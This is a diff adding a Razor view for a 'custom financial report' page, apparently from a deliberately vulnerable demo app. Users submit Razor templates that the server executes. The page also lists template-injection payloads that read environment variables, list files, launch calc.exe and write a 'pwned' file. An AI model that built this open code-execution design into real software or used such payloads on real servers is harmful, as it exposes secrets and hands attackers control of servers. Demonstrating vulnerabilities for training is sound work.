@@ -1,0 +1,151 @@
+@{
+    ViewData["Title"] = "Generate Financial Report";
+    Layout = "~/Views/Shared/_Layout.cshtml";
+}
+
+<div class="container mt-4">
+    <div class="row">
+        <div class="col-md-12">
+            <h2><i class="fas fa-file-alt"></i> Generate Custom Financial Report</h2>
+            <p class="lead">Create personalized financial reports using custom templates.</p>
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="col-md-6">
+            <div class="card">
+                <div class="card-header">
+                    <h5 class="mb-0"><i class="fas fa-code"></i> Custom Template</h5>
+                </div>
+                <div class="card-body">
+                    <form action="/Transaction/GenerateReport" method="post" target="_blank">
+                        <div class="form-group mb-3">
+                            <label for="reportTemplate">Report Template:</label>
+                            <textarea class="form-control" id="reportTemplate" name="reportTemplate" rows="15" 
+                                      placeholder="Enter your custom report template here...">@ViewBag.SampleTemplate</textarea>
+                            <small class="form-text text-muted">
+                                Use Razor syntax: @@Model.Property, @@foreach, @@if, @@{code blocks}
+                            </small>
+                        </div>
+                        
+                        <div class="form-group mb-3">
+                            <label for="format">Output Format:</label>
+                            <select class="form-control" id="format" name="format">
+                                <option value="html">HTML (Browser)</option>
+                                <option value="pdf">Text File Download</option>
+                            </select>
+                        </div>
+                        
+                        <button type="submit" class="btn btn-primary">
+                            <i class="fas fa-file-export"></i> Generate Report
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+        
+        <div class="col-md-6">
+            <div class="card">
+                <div class="card-header">
+                    <h5 class="mb-0"><i class="fas fa-info-circle"></i> Template Help</h5>
+                </div>
+                <div class="card-body">
+                    <h6>Available Model Properties:</h6>
+                    <ul class="list-unstyled">
+                        <li><code>@@Model.User.Email</code> - User email</li>
+                        <li><code>@@Model.User.FirstName</code> - First name</li>
+                        <li><code>@@Model.User.LastName</code> - Last name</li>
+                        <li><code>@@Model.Transactions</code> - Transaction list</li>
+                        <li><code>@@Model.TotalAmount</code> - Total amount</li>
+                        <li><code>@@Model.TransactionCount</code> - Count</li>
+                        <li><code>@@Model.GeneratedDate</code> - Report date</li>
+                        <li><code>@@Model.Environment</code> - Environment vars</li>
+                        <li><code>@@Model.MachineName</code> - Machine name</li>
+                    </ul>
+                    
+                    <h6>Razor Syntax Examples:</h6>
+                    <div class="bg-light p-2 mb-2">
+                        <code>@@foreach(var txn in Model.Transactions)<br/>
+                        {<br/>
+                        &nbsp;&nbsp;&lt;p&gt;@@txn.Company&lt;/p&gt;<br/>
+                        }</code>
+                    </div>
+                    
+                    <div class="bg-light p-2 mb-2">
+                        <code>@@if(Model.TotalAmount > 1000)<br/>
+                        {<br/>
+                        &nbsp;&nbsp;&lt;p&gt;High value account&lt;/p&gt;<br/>
+                        }</code>
+                    </div>
+                    
+                    <div class="bg-light p-2 mb-2">
+                        <code>@@{<br/>
+                        &nbsp;&nbsp;var total = Model.TotalAmount * 1.1m;<br/>
+                        &nbsp;&nbsp;// Any C# code can go here<br/>
+                        }</code>
+                    </div>
+                    
+                    <div class="alert alert-warning mt-3">
+                        <h6><i class="fas fa-exclamation-triangle"></i> Security Note:</h6>
+                        <p class="mb-0">This feature demonstrates template injection vulnerabilities. In production, user templates should be sanitized and executed in a sandboxed environment.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="row mt-4">
+        <div class="col-md-12">
+            <div class="card">
+                <div class="card-header">
+                    <h5 class="mb-0"><i class="fas fa-bug text-danger"></i> Vulnerability Examples</h5>
+                </div>
+                <div class="card-body">
+                    <div class="alert alert-danger">
+                        <h6><strong>WARNING:</strong> These examples demonstrate DANGEROUS template injection attacks!</h6>
+                        <p>The following templates will execute arbitrary code on the server:</p>
+                        
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h6>System Information Disclosure:</h6>
+                                <pre class="bg-dark text-light p-2">@@{System.Environment.GetEnvironmentVariables()}</pre>
+                                <pre class="bg-dark text-light p-2">@@{System.Environment.MachineName}</pre>
+                                <pre class="bg-dark text-light p-2">@@{System.IO.Directory.GetFiles("C:\\")}</pre>
+                            </div>
+                            <div class="col-md-6">
+                                <h6>Code Execution:</h6>
+                                <pre class="bg-dark text-light p-2">@@{System.Diagnostics.Process.Start("calc.exe")}</pre>
+                                <pre class="bg-dark text-light p-2">@@{System.IO.File.WriteAllText("C:\\temp\\pwned.txt", "Hacked!")}</pre>
+                                <pre class="bg-dark text-light p-2">@@{System.Reflection.Assembly.GetExecutingAssembly()}</pre>
+                            </div>
+                        </div>
+                        
+                        <p class="mt-2 mb-0"><strong>Note:</strong> These examples will actually execute when processed by the RazorLight engine!</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+.bg-dark pre {
+    font-size: 0.9em;
+    border-radius: 4px;
+}
+
+.card {
+    margin-bottom: 20px;
+}
+
+textarea {
+    font-family: 'Courier New', Consolas, monospace;
+    font-size: 14px;
+}
+
+code {
+    background-color: #f8f9fa;
+    padding: 2px 4px;
+    border-radius: 3px;
+}
+</style>
